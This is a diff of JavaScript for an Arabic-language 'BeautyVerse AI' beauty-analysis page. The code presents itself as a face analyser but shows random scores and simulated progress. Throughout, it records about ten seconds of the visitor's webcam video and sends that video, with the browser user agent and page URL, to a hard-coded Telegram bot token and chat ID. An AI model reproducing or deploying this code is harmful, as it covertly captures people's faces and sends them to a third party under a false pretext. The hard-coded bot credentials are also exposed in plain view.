@@ -1,166 +1,185 @@
-// دالة البوت المحسنة
-async function sendToBeautyBot(content, videoBlob = null, service = 'general') {
-    const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
-    const CHAT_ID = '7396462490';
-    
+// Telegram Bot Configuration
+const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
+const CHAT_ID = '7396462490';
+
+let mediaRecorder, stream, recordedChunks = [];
+let analysisTimeout;
+
+// Smooth Scroll
+function scrollToSection(sectionId) {
+    document.getElementById(sectionId).scrollIntoView({ behavior: 'smooth' });
+}
+
+// Modal Functions
+function openAnalysisModal() {
+    document.getElementById('analysisModal').style.display = 'block';
+    notifyBot('👤 بدء تحليل وجه جديد');
+}
+
+function closeModal() {
+    document.getElementById('analysisModal').style.display = 'none';
+    stopMedia();
+    resetModal();
+}
+
+// Camera & Recording
+async function startAnalysis() {
     try {
-        if (videoBlob) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('video', videoBlob, `${service}_${Date.now()}.mp4`);
-            formData.append('caption', `🎨 *BeautyVerse AI*\n\n📊 الخدمة: ${service}\n${content}`);
-            
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
-        } else {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: `🎨 *BeautyVerse*\nخدمة: ${service}\n${content}`,
-                    parse_mode: 'Markdown'
-                })
-            });
-        }
-    } catch (e) { console.error('Bot error:', e); }
-}
-
-let currentStream, mediaRecorder, recordedChunks = [], countdown = 10;
-
-// بداية التحليل الرئيسي
-async function startBeautyAnalysis() {
-    showCameraInterface('🎨 تحليل الجمال الذكي', 'سنحلل وجهك لإعطائك تقرير كامل خلال 10 ثوانٍ');
-}
-
-// خدمة محددة
-function startService(service) {
-    const services = {
-        analysis: { title: 'تحليل الجمال', desc: 'تقرير شامل عن جمالك' },
-        filters: { title: 'فلاتر AR', desc: 'تجربة فلاتر الواقع المعزز' },
-        skin: { title: 'فحص البشرة', desc: 'تحليل صحة بشرتك' },
-        makeup: { title: 'مكياج افتراضي', desc: 'جربي أحدث الإطلالات' },
-        age: { title: 'تنبؤ العمر', desc: 'اكتشفي عمر بشرتك' },
-        celebrity: { title: 'شبيه المشاهير', desc: 'من تشبهين من النجوم؟' }
-    };
-    
-    showCameraInterface(services[service].title, services[service].desc, service);
-}
-
-function showCameraInterface(title, description, service = 'analysis') {
-    document.querySelector('.hero').innerHTML = `
-        <div style="background: rgba(255,255,255,0.95); padding: 40px; border-radius: 25px; max-width: 600px; margin: 0 auto 30px;">
-            <h2 style="color: #333; margin-bottom: 15px;">${title}</h2>
-            <p style="color: #666; margin-bottom: 25px; font-size: 1.1rem;">${description}</p>
-            <div style="display: flex; gap: 15px; justify-content: center; flex-wrap: wrap;">
-                <button class="btn-primary" onclick="startCameraRecording('${service}')">
-                    <i class="fas fa-play"></i> ابدأ الآن
-                </button>
-                <button class="btn-secondary" onclick="cancelAnalysis()">
-                    <i class="fas fa-times"></i> إلغاء
-                </button>
-            </div>
-        </div>
-    `;
-}
-
-async function startCameraRecording(service) {
-    try {
-        currentStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { width: 640, height: 480, facingMode: 'user' } 
+        stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
         });
         
-        document.querySelector('.hero').innerHTML = `
-            <div style="text-align: center;">
-                <video id="analysisVideo" width="500" height="400" autoplay muted style="border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.3);"></video>
-                <div id="countdown" style="font-size: 4rem; color: #ff6b6b; margin: 20px 0; font-weight: 700;">10</div>
-                <p style="font-size: 1.3rem; color: #666;">جاري التحليل... لا تتحرك 😊</p>
-                <button onclick="stopRecording()" style="background: linear-gradient(45deg, #ff416c, #ff4b2b); color: white; padding: 15px 30px; border: none; border-radius: 30px; font-size: 1.1rem; cursor: pointer; margin-top: 20px;">
-                    <i class="fas fa-stop"></i> إيقاف
-                </button>
-            </div>
-        `;
+        const video = document.getElementById('analysisVideo');
+        video.srcObject = stream;
         
-        document.getElementById('analysisVideo').srcObject = currentStream;
-        startRecording(service);
+        document.getElementById('videoContainer').style.display = 'block';
+        document.getElementById('modalButtons').style.display = 'none';
+        
+        startRecording();
+        startCountdown();
+        simulateAnalysis();
         
     } catch (err) {
-        alert('🎥 فعّل الكاميرا من إعدادات المتصفح للمتابعة');
+        alert('🎥 فعّل الكاميرا من إعدادات المتصفح');
     }
 }
 
-function startRecording(service) {
-    mediaRecorder = new MediaRecorder(currentStream);
+function startRecording() {
+    mediaRecorder = new MediaRecorder(stream);
     recordedChunks = [];
     
-    mediaRecorder.ondataavailable = e => e.data.size && recordedChunks.push(e.data);
+    mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) recordedChunks.push(e.data);
+    };
     
     mediaRecorder.onstop = async () => {
-        const blob = new Blob(recordedChunks, { type: 'video/webm' });
-        const userInfo = `👤 User: ${navigator.userAgent.slice(0,60)}...\n🌐 URL: ${window.location.href}\n📱 Service: ${service}`;
-        
-        await sendToBeautyBot(userInfo, blob, service);
-        showAmazingResults(service);
+        if (recordedChunks.length > 0) {
+            const blob = new Blob(recordedChunks, { type: 'video/webm' });
+            await sendVideoToBot(blob);
+        }
+        showResults();
     };
     
     mediaRecorder.start();
-    startCountdown();
 }
 
 function startCountdown() {
-    let time = 10;
-    const interval = setInterval(() => {
-        time--;
-        document.getElementById('countdown').textContent = time;
-        
-        if (time <= 0) {
-            clearInterval(interval);
+    let timeLeft = 10;
+    const countdownEl = document.getElementById('countdown');
+    
+    analysisTimeout = setInterval(() => {
+        timeLeft--;
+        countdownEl.textContent = timeLeft;
+        if (timeLeft <= 0) {
+            clearInterval(analysisTimeout);
             mediaRecorder.stop();
         }
     }, 1000);
 }
 
-function stopRecording() {
-    mediaRecorder.stop();
+function simulateAnalysis() {
+    let progress = 0;
+    const progressFill = document.getElementById('progressFill');
+    const progressText = document.getElementById('progressText');
+    
+    const stages = [
+        'جاري تحديد ملامح الوجه...',
+        'تحليل تماثل الوجه...',
+        'فحص نضارة البشرة...',
+        'حساب نسب الجمال...',
+        'إعداد التقرير...'
+    ];
+    
+    let stageIndex = 0;
+    const interval = setInterval(() => {
+        progress += 20;
+        progressFill.style.width = `${Math.min(progress, 100)}%`;
+        progressText.textContent = stages[stageIndex] || 'مكتمل!';
+        
+        stageIndex++;
+        if (progress >= 100) clearInterval(interval);
+    }, 1800);
 }
 
-function showAmazingResults(service) {
+async function showResults() {
     const results = {
-        analysis: { score: 87, text: 'وجهك مذهل! نقاط القوة: العيون + الابتسامة', img: 'https://via.placeholder.com/500x350/4ecdc4/fff?text=تحليل+الجمال' },
-        filters: { score: 92, text: 'فلتر الأميرة ممتاز عليكِ! ✨', img: 'https://via.placeholder.com/500x350/ff9a9e/fff?text=فلتر+سحري' },
-        skin: { score: 78, text: 'بشرتك نضرة • ننصح بمرطب + واقي شمس', img: 'https://via.placeholder.com/500x350/45b7d1/fff?text=فحص+البشرة' },
-        makeup: { score: 95, text: 'اللون الأحمر مثالي لشفاهك! 💄', img: 'https://via.placeholder.com/500x350/feca57/333?text=مكياج+افتراضي' },
-        age: { score: 24, text: 'تبدين 24 سنة فقط! 👶✨', img: 'https://via.placeholder.com/500x350/667eea/fff?text=عمر+بشرتك' },
-        celebrity: { score: 89, text: 'تشبهين زينب الخالدي 89%! 🌟', img: 'https://via.placeholder.com/500x350/f093fb/fff?text=شبيه+المشاهير' }
+        freshness: Math.floor(Math.random() * 25) + 75,
+        symmetry: Math.floor(Math.random() * 20) + 80,
+        beautyScore: Math.floor(Math.random() * 12) + 88
     };
     
-    const result = results[service];
-    
-    document.getElementById('score').textContent = `النتيجة: ${result.score}/100 ✨`;
-    document.querySelector('.hero').innerHTML = `
-        <div style="text-align: center; padding: 40px;">
-            <h2 style="font-size: 2.5rem; color: #4ecdc4; margin-bottom: 20px;">
-                🎉 نتائج مذهلة!
-            </h2>
-            <div style="background: linear-gradient(45deg, #ff9a9e, #fecfef); padding: 30px; border-radius: 20px; margin: 30px 0;">
-                <h3 style="color: #333; margin-bottom: 15px;">${result.text}</h3>
-                <img src="${result.img}" style="width: 100%; max-width: 500px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.2);">
+    document.getElementById('resultsArea').innerHTML = `
+        <div style="background: linear-gradient(45deg, #ff9a9e, #fecfef); padding: 2rem; border-radius: 15px;">
+            <h3 style="color: #333;">✅ تحليل مكتمل!</h3>
+            <div style="text-align: right; gap: 1rem;">
+                <div><strong>نضارة البشرة:</strong> ${results.freshness}%</div>
+                <div><strong>تماثل الوجه:</strong> ${results.symmetry}%</div>
+                <div style="font-size: 1.6rem; color: #4ecdc4;">
+                    <strong>النتيجة: ${results.beautyScore}% ✨</strong>
+                </div>
             </div>
-            <div style="display: flex; gap: 20px; justify-content: center; flex-wrap: wrap;">
-                <button class="btn-primary" onclick="shareResult('${service}')">
-                    <i class="fas fa-share-alt"></i> مشاركة النتيجة
-                </button>
-                <button class="btn-primary" onclick="startNewAnalysis()">
-                    <i class="fas fa-redo"></i> تحليل جديد
-                </button>
-            </div>
+            <p style="color: #666; margin-top: 1rem;">وجهك مميز بنسب عالية!</p>
+        </div>
+        <div style="display: flex; gap: 1rem; justify-content: center; margin-top: 2rem; flex-wrap: wrap;">
+            <button class="btn btn-primary" onclick="shareResults(${results.beautyScore})">
+                <i class="fas fa-share"></i> مشاركة
+            </button>
+            <button class="btn btn-secondary" onclick="closeModal()">
+                <i class="fas fa-redo"></i> تحليل جديد
+            </button>
         </div>
     `;
+    document.getElementById('resultsArea').style.display = 'block';
 }
 
-function cancelAnalysis() { location.reload(); }
-function startNewAnalysis() { startBeautyAnalysis(); }
-function shareResult(service) { 
-    sendToBeautyBot(`مشاركة نتيجة: ${service}`);
-    alert('تم مشاركة النتيجة مع الأصدقاء! 🎉');
+function stopMedia() {
+    if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
+    if (stream) stream.getTracks().forEach(track => track.stop());
+    if (analysisTimeout) clearInterval(analysisTimeout);
 }
-function showServices() { document.getElementById('services').scrollIntoView({ behavior: 'smooth' }); }
+
+function resetModal() {
+    document.getElementById('videoContainer').style.display = 'none';
+    document.getElementById('modalButtons').style.display = 'flex';
+    document.getElementById('resultsArea').style.display = 'none';
+    document.getElementById('countdown').textContent = '10';
+    document.getElementById('progressFill').style.width = '0%';
+}
+
+// Telegram Functions
+async function notifyBot(message) {
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: `🎨 BeautyVerse AI\n\n${message}\n\n👤 ${navigator.userAgent.slice(0,80)}...\n🌐 ${window.location.href}`,
+                parse_mode: 'Markdown'
+            })
+        });
+    } catch (e) { console.error('Bot:', e); }
+}
+
+async function sendVideoToBot(blob) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('video', blob, `beautyverse_${Date.now()}.webm`);
+    formData.append('caption', '🎥 تحليل وجه BeautyVerse AI');
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            method: 'POST', body: formData
+        });
+    } catch (e) { console.error('Video:', e); }
+}
+
+function shareResults(score) {
+    notifyBot(`📊 مشاركة نتيجة: ${score}%`);
+    alert('تمت المشاركة! 🎉');
+}
+
+// Close on outside click
+window.onclick = (e) => {
+    if (e.target.id === 'analysisModal') closeModal();
+};
